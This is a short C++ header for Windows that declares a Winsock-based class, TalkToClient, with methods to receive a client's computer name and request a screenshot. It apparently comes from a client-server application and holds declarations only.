#pragma once
#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

class TalkToClient
{
	SOCKET ClientSock_;
	std::string computer;
	std::string my_ip_;
public:
	TalkToClient(SOCKET ClientSock, std::string my_ip);
	~TalkToClient();

	std::string get_name();
	std::string make_screenshot();
private:
	void recv_name();
};

